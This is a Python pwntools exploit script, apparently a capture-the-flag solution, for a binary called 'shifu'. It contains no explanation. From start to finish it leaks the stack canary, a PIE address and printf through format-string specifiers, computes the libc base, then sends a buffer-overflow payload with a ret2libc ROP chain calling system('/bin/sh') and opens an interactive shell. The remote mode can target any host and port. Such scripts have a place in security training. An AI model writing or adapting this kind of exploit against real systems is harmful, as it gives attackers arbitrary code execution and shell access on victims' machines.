#!/usr/bin/python3
# Author: Hack.You

from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break main
piebase
continue
'''.format(**locals())

# Binary filename
exe = './shifu'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False) 
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

#libc = ELF('libc.so.6')
libc = elf.libc

# Leak stack canary address & pie address
stack_leak = '%11$p'
pie_leak = '%15$p'
io.sendlineafter(b':', stack_leak.encode() + b' ' + pie_leak.encode())
io.recvuntil(b'Welcome: ')

# Extract the two addresses from the response
leak = io.recvline().decode().strip().split(' ')
canary = int(leak[0], 16)
leakedpie = int(leak[1], 16)
info("Canary address: %#x", canary)
info("Leaked Pie address: %#x", leakedpie)

# Calculate pie base address
elf.address = leakedpie - 0x127c
info("Piebase address: %#x", elf.address)

# Extract printf address
io.recvuntil('Here is a gift for you:')
leak2 = io.recvline().decode().strip().split(' ')
printf = int(leak2[0], 16)
info("Leaked printf address: %#x", printf)

# Calculate base address
libc.address =  printf - libc.symbols['printf']
info("Libc base address %#x", libc.address)

# Send the exploit 
offset = 136 # overwrite the canary
padding = 8 
ret = 0x1016 # 0x0000000000001016: ret; 
movaps = ret + elf.address # allign the stack 

rop = ROP(libc)
sh = next(libc.search(b'/bin/sh'))
shell = rop.system(sh)
chain = rop.chain()
info("System address found %#x", libc.symbols['system'])
info("/bin/sh address: %#x", sh)

payload = flat({
    offset: [
        canary,
        padding,
        movaps,
        chain
    ]
})

io.recvuntil('Enter your agent!')
io.sendline(payload)

io.interactive()
